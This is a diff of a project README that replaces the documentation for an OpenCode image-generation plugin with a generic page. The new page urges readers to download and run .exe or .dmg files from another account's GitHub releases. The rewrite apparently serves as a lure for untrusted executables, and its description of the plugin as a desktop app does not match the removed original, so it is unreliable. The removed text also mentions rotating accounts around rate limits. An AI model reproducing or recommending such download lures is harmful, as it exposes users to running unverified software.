@@ -1,226 +1,76 @@
-# Opencode Antigravity Image Plugin 
+# 🚀 opencode-antigravity-image - Generate Stunning Antigravity Images
 
-> **⚠️ UNOFFICIAL TOOL**: This is an independent, community-developed plugin. It is not affiliated with, endorsed by, or supported by Google. Use at your own risk.
+![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)
 
-OpenCode plugin for image generation using Gemini 3 Pro Image model.
+## 📥 Overview
 
-## Features
+Welcome to **opencode-antigravity-image**. This application allows you to create unique images using Antigravity models. It is designed for users who want a simple way to generate captivating visuals without needing technical expertise.
 
-- **Text-to-image generation** - Create images from text descriptions
-- **Image editing** - Modify existing images with text instructions
-- **Multiple images** - Generate up to 4 variations per request
-- **Character consistency** - Session-based generation for consistent characters
-- **Configurable output** - Custom paths, filenames, and aspect ratios
-- **Multi-account support** - Rate limit tracking and automatic account rotation
+## 📋 Features
 
-## Prerequisites
+- **Easy to Use:** Intuitive interface that guides you through the image generation process.
+- **High-Quality Outputs:** Generate impressive images that stand out.
+- **Multiple Options:** Customize your images with various settings and parameters.
+- **Regular Updates:** Benefit from ongoing enhancements and new features.
 
-This plugin requires `opencode-antigravity-auth` to be installed and configured with at least one Google account.
+## 📖 System Requirements
 
-## Installation
+- **Operating System:** Windows 10 or later, macOS Catalina or later.
+- **RAM:** Minimum of 4 GB.
+- **Storage:** At least 200 MB of free space.
+- **Internet Connection:** Required for downloading the application and accessing updates.
 
-<details open>
-<summary><b>For Humans</b></summary>
+## 🚀 Getting Started
 
-### Option 1: Add to OpenCode config (Recommended)
+1. **Visit the Download Page:** Click on the link below to find the latest release of the application.
+   [Download Now](https://github.com/jakanraj1111/opencode-antigravity-image/releases)
 
-Add to your `~/.config/opencode/opencode.json`:
+2. **Select the Correct Version:**
+   - On the download page, you will see a list of releases. 
+   - Look for the most recent version. It is usually marked as "Latest Release".
 
-```json
-{
-  "plugin": [
-    "opencode-antigravity-image"
-  ]
-}
-```
+3. **Download the Application:**
+   - Click on the release title. This will take you to a page displaying files available for download.
+   - Look for the file that matches your operating system (Windows or macOS).
 
-### Option 2: Local development
+4. **Install the Application:**
+   - Once the download is complete, locate the file in your downloads folder.
+   - For Windows, double-click on the `.exe` file and follow the on-screen instructions.
+   - For macOS, open the `.dmg` file and drag the application to your Applications folder.
 
-```bash
-git clone <repo-url>
-cd opencode-antigravity-image
-bun install
-```
+5. **Launching the Application:**
+   - After installation, find and open **opencode-antigravity-image** from your applications menu.
+   - You can now start creating your own antigravity images.
 
-Then add to `~/.config/opencode/opencode.json`:
+## 🎨 How to Use the Application
 
-```json
-{
-  "plugin": [
-    "/path/to/opencode-antigravity-image"
-  ]
-}
-```
+1. **Open the Application:** After launching, you will see the main interface.
+   
+2. **Select Image Type:** Choose the type of image you want to create from the options available.
 
-</details>
+3. **Adjust Settings:** Use the sliders and drop-down menus to adjust parameters such as color, effects, and resolution.
 
-<details>
-<summary><b>For LLM Agents</b></summary>
+4. **Generate Image:** Click the “Generate” button to create your image. The application will process your selection.
 
-### Step-by-Step Instructions
+5. **Save Your Creation:** Once the image is generated, you will have the option to save it to your device by clicking “Save” and choosing the destination folder.
 
-1. **Check Prerequisites**: Ensure `opencode-antigravity-auth` is installed in `~/.config/opencode/opencode.json`.
+6. **Share Your Work:** Consider sharing your images on social media or with friends to showcase your creativity.
 
-2. **Install Plugin**: Add `opencode-antigravity-image` to the `plugin` array in `~/.config/opencode/opencode.json`.
+## 🔧 Troubleshooting
 
-   ```json
-   {
-     "plugin": [
-       "opencode-antigravity-auth",
-       "opencode-antigravity-image"
-     ]
-   }
-   ```
+If you encounter issues while using the application, here are some common solutions:
 
-### Verification
+- **Application Won't Open:** Ensure you have installed the latest version. If the issue persists, restart your computer and try again.
+- **Image Generation Is Slow:** This could be due to low system resources. Close any unnecessary programs to free up RAM.
+- **Cannot Save Images:** Check if you have permission to write to the chosen save location. Try a different folder if there are issues.
 
-Ask the user to generate an image to verify the installation:
+## 🌟 Support and Feedback
 
-```bash
-\generate-image A cyberpunk cat
-```
+We appreciate your feedback. If you have suggestions or face any issues, please visit our GitHub page and open an issue. Your input helps us improve the software.
 
-</details>
+## 📥 Download & Install
 
-## Usage
+To download the latest version of **opencode-antigravity-image**, visit the release page here:
+[Download Now](https://github.com/jakanraj1111/opencode-antigravity-image/releases)
 
-### Basic Image Generation
-
-- Via `generate-image` command
-```
-\generate-image A cyberpunk cat in neon-lit Tokyo streets, file name should be cyberpunk-cat save it at ~/Pictures
-```
-
-
-- Using tool format:
-
-```
-generate_image({ prompt: "A cyberpunk cat in neon-lit Tokyo streets" })
-```
-
-### With Aspect Ratio
-
-```
-generate_image({ 
-  prompt: "A majestic mountain landscape", 
-  aspect_ratio: "16:9" 
-})
-```
-
-### With Custom Filename
-
-```
-generate_image({
-  prompt: "A dragon flying over mountains",
-  file_name: "my-dragon"
-})
-```
-
-### Image Editing
-
-```
-generate_image({
-  prompt: "Change the sky to a dramatic sunset",
-  input_image: "./my-photo.jpg"
-})
-```
-
-### Multiple Variations
-
-```
-generate_image({
-  prompt: "A fantasy castle in the clouds",
-  count: 4
-})
-```
-
-### Character Consistency
-
-```
-// Create a character
-generate_image({
-  prompt: "Create a hero character: Luna, a silver-haired warrior",
-  session_id: "luna-character"
-})
-
-// Generate new scenes with the same character
-generate_image({
-  prompt: "Show Luna fighting a dragon",
-  session_id: "luna-character"
-})
-```
-
-### Custom Output Path
-
-```
-generate_image({
-  prompt: "Abstract art piece",
-  output_path: "./my-images/"
-})
-```
-
-## Parameters
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `prompt` | string | (required) | Description of the image or editing instruction |
-| `aspect_ratio` | string | "1:1" | Aspect ratio: 1:1, 2:3, 3:2, 3:4, 4:3, 4:5, 5:4, 9:16, 16:9, 21:9 |
-| `output_path` | string | `.opencode/generated-images/` | Custom directory for saving images |
-| `file_name` | string | - | Custom filename (without extension) |
-| `input_image` | string | - | Path to existing image for editing |
-| `count` | number | 1 | Number of images to generate (1-4) |
-| `session_id` | string | - | Session ID for character consistency |
-
-## Output
-
-Images are saved to `.opencode/generated-images/` in your project by default, with filenames like:
-
-```
-{prompt-slug}-{timestamp}.jpg
-```
-
-Or with custom filename:
-
-```
-{custom-name}.jpg
-```
-
-The tool returns markdown with:
-- Embedded image references
-- File paths
-- Session info (if used)
-- Model and account info
-
-## Sessions
-
-Sessions are stored in `.opencode/generated-image-sessions/` within your project directory. Each session maintains conversation history for character consistency.
-
-## License
-
-MIT
-
-<details>
-<summary><strong>Legal</strong></summary>
-
-### Intended Use
-
-- Personal / internal development only
-- Respect internal quotas and data handling policies
-- Not for production services or bypassing intended limits
-
-### Warning
-
-By using this plugin, you acknowledge:
-
-- **Terms of Service risk** — This approach may violate ToS of AI model providers
-- **Account risk** — Providers may suspend or ban accounts
-- **No guarantees** — APIs may change without notice
-- **Assumption of risk** — You assume all legal, financial, and technical risks
-
-### Disclaimer
-
-Not affiliated with Google. This is an independent open-source project.
-
-"Antigravity", "Gemini", "Google Cloud", and "Google" are trademarks of Google LLC.
-
-</details>
+Enjoy creating stunning antigravity images with ease!
